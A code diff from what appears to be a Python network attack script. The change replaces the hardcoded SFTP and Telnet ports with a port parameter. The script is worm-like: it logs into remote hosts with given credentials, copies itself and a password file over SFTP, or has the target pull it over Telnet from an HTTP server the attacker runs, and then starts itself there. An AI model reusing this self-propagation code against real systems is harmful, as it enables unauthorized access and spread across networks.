@@ -209,7 +209,7 @@ def transfer_file(ip, username, password, port, self_propagate):
     except KeyError:
         return False
 
-    successful = transfer_file_function(ip, username, password, target_directory, self_propagate)
+    successful = transfer_file_function(ip, username, password, port, target_directory, self_propagate)
 
     if self_propagate:
         information_message = "Success! %s started on %s" % (SCRIPT_FILENAME, ip) if successful else "Self propagation failed\n"
@@ -224,14 +224,13 @@ def transfer_file(ip, username, password, port, self_propagate):
 # and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
 # the provided user is found to not have sudo access then the function will terminate.
 # Return True if the file was successfully transferred (and deployed if self propagation) False otherwise
-def transfer_file_with_sftp(ip, username, password, target_directory, self_propagate):
+def transfer_file_with_sftp(ip, username, password, port, target_directory, self_propagate):
     information_message = "Attempting self propagation with SFTP..." if self_propagate else "Deploying file with SFTP..."
-    sftp_port = 22
     print(information_message)
     client = SSHClient()
     try:
         client.set_missing_host_key_policy(AutoAddPolicy())
-        client.connect(ip, username=username, password=password, port=sftp_port)
+        client.connect(ip, username=username, password=password, port=port)
         with client.open_sftp() as sftp_client:
             local_dir = os.getcwd()
 
@@ -285,11 +284,9 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
 # and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
 # the provided user is found to not have sudo access then the function will terminate.
 # Return True if the file was successfully transferred (and deployed if self propagation) False otherwise
-def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate):
+def transfer_file_with_http_server(ip, username, password, port, target_directory, self_propagate):
     information_message = "Attempting self propagation with HTTP..." if self_propagate else "Deploying file with HTTP..."
     print(information_message)
-
-    telnet_port = 23
 
     server_ip = get_server_ip_from_ip(ip)
     port_number = get_server_port_number()
@@ -317,7 +314,7 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
     start_net_attack_command = encode_in_ascii(START_SCRIPT_INPUT % (SCRIPT_FILENAME, username, DEPLOYMENT_FILENAME))
     wait_for = encode_in_ascii(WAIT_FOR_PROMPT)
 
-    connection = Telnet(ip, port=telnet_port)
+    connection = Telnet(ip, port=port)
     connection.read_until(login_prompt)
     connection.write(username_input)
     connection.read_until(password_prompt)
